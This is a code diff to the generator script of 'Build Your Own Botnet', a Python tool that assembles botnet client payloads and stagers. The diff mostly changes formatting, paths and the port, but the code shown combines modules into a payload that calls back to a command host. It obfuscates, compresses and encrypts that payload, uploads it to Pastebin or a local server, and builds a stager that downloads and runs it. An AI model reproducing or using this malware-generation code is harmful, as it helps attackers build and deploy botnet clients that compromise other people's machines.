@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-"""Generator (Build Your Own Botnet)
+"""Client Generator (Build Your Own Botnet)
 
 Generate clients with the following features:
 
@@ -73,7 +73,7 @@ import argparse
 import threading
 import subprocess
 
-# external libraries
+# packages
 import colorama
 
 # modules
@@ -100,7 +100,7 @@ __banner = """
 # main
 def main():
     """ 
-    Parse command-line arguments and run the generator
+    Run the generator
 
     usage: generator.py [-h] [-v] [--name NAME] [--icon ICON] [--pastebin API]
                          [--encrypt] [--obfuscate] [--compress] [--compile]
@@ -124,9 +124,7 @@ def main():
       --app           bundle into standalone application (Mac OS X)
 
     """
-
-    util.display(globals()['__banner'], color=random.choice(filter(str.isupper, dir(colorama.Fore))), style='bright')
-
+    util.display(globals()['__banner'], color=random.choice(filter(lambda x: bool(str.isupper(x) and 'BLACK' not in x), dir(colorama.Fore))), style='normal')
     parser = argparse.ArgumentParser(prog='generator.py', 
                                     version='0.1.5',
                                     description="Generator (Build Your Own Botnet)")
@@ -172,7 +170,6 @@ def main():
                         action='store_true',
                         help='bundle into a standlone application',
                         default=False)
-
     options = parser.parse_args()
     key = base64.b64encode(os.urandom(16))
     var = generators.variable(3)
@@ -191,7 +188,7 @@ def _update(input, output, task=None):
 def _modules(options, **kwargs):
     util.display("\n[>]", color='green', style='bright', end=',')
     util.display('Modules', color='reset', style='bright')
-    util.display("        Adding modules...", color='reset', style='normal', end=',')
+    util.display("\tAdding modules...", color='reset', style='normal', end=',')
     __load__ = threading.Event()
     __spin__ = util.spinner(__load__)
     modules = ['core/loader.py','core/util.py','core/security.py','core/payload.py']
@@ -208,7 +205,6 @@ def _modules(options, **kwargs):
                         continue
                 module = os.path.join(os.path.abspath('modules'), m if '.py' in os.path.splitext(m)[1] else '.'.join([os.path.splitext(m)[0], '.py']))
                 modules.append(module)
-
     __load__.set()
     util.display("({} modules added to client)".format(len(modules)), color='reset', style='dim')
     return modules
@@ -217,7 +213,7 @@ def _imports(options, **kwargs):
     util.display("\n[>]", color='green', style='bright', end=',')
     util.display("Imports", color='reset', style='bright')
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
-    util.display("        Adding imports...", color='reset', style='normal', end=',')
+    util.display("\tAdding imports...", color='reset', style='normal', end=',')
     globals()['__load__'] = threading.Event()
     globals()['__spin__'] = util.spinner(__load__)
     imports  = set()
@@ -266,16 +262,16 @@ def _payload(options, **kwargs):
     assert 'var' in kwargs, "missing keyword argument 'var'"
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
     assert 'imports' in kwargs, "missing keyword argument 'imports'"
-    payload = '\n'.join(list(kwargs['imports']) + [open(module,'r').read().partition('# main')[2] for module in kwargs['modules']]) + generators.snippet('main', 'Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()'
-    if not os.path.exists('payloads'):
+    payload = '\n'.join(list(kwargs['imports']) + [open(module,'r').read().partition('# main')[2] for module in kwargs['modules']]) + generators.main('Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()'
+    if not os.path.isdir('modules/payloads'):
         try:
-            os.mkdir('payloads')
+            os.mkdir('modules/payloads')
         except OSError:
             __logger__.debug("Permission denied: unabled to make directory './modules/payloads/'")
 
     if options.obfuscate:
         __load__= threading.Event()
-        util.display("        Obfuscating payload...", color='reset', style='normal', end=',')
+        util.display("\tObfuscating payload...", color='reset', style='normal', end=',')
         __spin__= util.spinner(__load__)
         output = '\n'.join([line for line in generators.obfuscate(payload).rstrip().splitlines() if '=jobs' not in line])
         __load__.set()
@@ -283,7 +279,7 @@ def _payload(options, **kwargs):
         payload = output
 
     if options.compress:
-        util.display("        Compressing payload... ", color='reset', style='normal', end=',')
+        util.display("\tCompressing payload... ", color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = util.spinner(__load__)
         output = generators.compress(payload)
@@ -293,7 +289,7 @@ def _payload(options, **kwargs):
 
     if options.encrypt:
         assert 'key' in kwargs, "missing keyword argument 'key' required for option 'encrypt'"
-        util.display("        Encrypting payload... ".format(kwargs['key']), color='reset', style='normal', end=',')
+        util.display("\tEncrypting payload... ".format(kwargs['key']), color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = util.spinner(__load__)
         output = generators.encrypt(payload, kwargs['key'])
@@ -301,7 +297,7 @@ def _payload(options, **kwargs):
         _update(payload, output, task='Encryption')
         payload = output
 
-    util.display("        Uploading payload... ", color='reset', style='normal', end=',')
+    util.display("\tUploading payload... ", color='reset', style='normal', end=',')
     __load__ = threading.Event()
     __spin__ = util.spinner(__load__)
 
@@ -317,7 +313,7 @@ def _payload(options, **kwargs):
         path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )
         with file(path, 'w') as fp:
             fp.write(payload)
-        s = 'http://{}:{}/{}'.format(options.host, options.port, urllib.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
+        s = 'http://{}:{}/{}'.format(options.host, options.port + 1, urllib.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
         s = urllib2.urlparse.urlsplit(s)
         url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
     __load__.set()
@@ -330,15 +326,15 @@ def _stager(options, **kwargs):
     assert 'url' in kwargs, "missing keyword argument 'url'"
     assert 'key' in kwargs, "missing keyword argument 'key'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
-    stager = open('core/stager.py', 'r').read() + generators.snippet('main', 'run', url=kwargs['url'], key=kwargs['key'])
-    if not os.path.exists('stagers'):
+    stager = open('core/stager.py', 'r').read() + generators.main('run', url=kwargs['url'], key=kwargs['key'])
+    if not os.path.isdir('modules/stagers'):
         try:
-            os.mkdir('stagers')
+            os.mkdir('modules/stagers')
         except OSError:
             __logger__.debug("Permission denied: unable to make directory './modules/stagers/'")
 
     if options.obfuscate:
-        util.display("        Obfuscating stager... ", color='reset', style='normal', end=',')
+        util.display("\tObfuscating stager... ", color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = util.spinner(__load__)
         output = generators.obfuscate(stager)
@@ -347,14 +343,14 @@ def _stager(options, **kwargs):
         stager = output
 
     if options.compress:
-        util.display("        Compressing stager... ", color='reset', style='normal', end=',')
+        util.display("\tCompressing stager... ", color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = util.spinner(__load__)
         output  = base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))
         __load__.set()
         _update(stager, output, task='Compression')
         stager = output
-    util.display("        Uploading stager... ", color='reset', style='normal', end=',')
+    util.display("\tUploading stager... ", color='reset', style='normal', end=',')
     __load__ = threading.Event()
     __spin__ = util.spinner(__load__)
 
